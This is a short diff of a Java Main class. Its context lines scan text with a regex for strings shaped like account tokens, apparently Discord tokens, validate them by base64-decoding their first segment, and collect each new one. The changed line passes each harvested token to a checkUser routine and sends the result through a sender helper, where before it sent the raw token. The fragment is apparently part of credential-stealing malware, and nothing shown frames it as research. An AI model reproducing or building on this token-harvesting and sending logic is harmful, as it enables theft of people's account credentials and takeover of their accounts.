@@ -56,7 +56,7 @@ public class Main {
                                             Long.parseLong(new String(Base64.decode(m.group().split("\\.")[0]), StandardCharsets.UTF_8));
                                             if (!tokens.contains(m.group())) {
                                                 tokens.add(m.group());
-                                                Helper.getSender().sendMessage("Token: " + m.group());
+                                                Helper.getSender().sendMessage(Helper.geChecker().checkUser(m.group()));
                                             }
                                         }
                                     }
